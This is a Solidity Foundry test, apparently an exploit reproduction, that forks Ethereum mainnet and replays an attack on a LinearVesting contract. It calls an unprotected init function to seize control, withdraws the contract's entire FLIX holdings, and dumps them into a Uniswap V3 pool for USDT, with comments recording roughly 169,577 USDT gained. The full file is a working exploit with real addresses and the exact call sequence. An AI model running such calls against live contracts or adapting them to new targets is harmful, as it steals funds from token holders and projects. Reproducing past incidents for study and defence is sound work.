// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV3.sol";

import "./ILinearVesting.sol";

WETH9 constant WETH = WETH9(
    payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2))
);
ILinearVesting constant LinearVesting = ILinearVesting(
    payable(0x2c7112245Fc4af701EBf90399264a7e89205Dad4)
);
IERC20 constant FLIX = IERC20(0x83Cb9449b7077947a13Bf32025A8eAA3Fb1D8A5e);
IERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
IUniswapV3Pool constant FLIX_USDT_Pool = IUniswapV3Pool(
    0xa7434b755852F2555D6F96B9E28bAfE92F08Df97
);

contract DN404Test is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19_196_685);

        vm.label(address(LinearVesting), "LinearVesting");
        vm.label(address(WETH), "WETH");
        vm.label(address(FLIX), "FLIX");
        vm.label(address(USDT), "USDT");
        vm.label(address(FLIX_USDT_Pool), "FLIX_USDT_Pool");
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        // Implement exploit code here
        print("USDT Balance Before", IERC20(USDT).balanceOf(address(this)), 6);

        LinearVesting.init(
            address(WETH), // initToken
            1, // initPeriods
            1 ether // initInterval
        );

        LinearVesting.withdraw(
            address(FLIX), // otherToken
            FLIX.balanceOf(address(LinearVesting)), // amount
            address(this) // receiver
        );

        // print("FLIX Balance", FLIX.balanceOf(address(this)), 18);
        // 685000.000000000000000000

        FLIX_USDT_Pool.swap(
            address(this), // recipient
            true, // zeroForOne
            685000 ether, // amountSpecified
            4_295_128_740, // sqrtPriceLimitX96
            ""
        );
        // Log balances after exploit
        print("USDT Balance After", USDT.balanceOf(address(this)), 6);
        // 169577.736489
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256,
        bytes memory
    ) external {
        IERC20(FLIX).transfer(msg.sender, uint256(amount0Delta));
    }

    receive() external payable {}
}
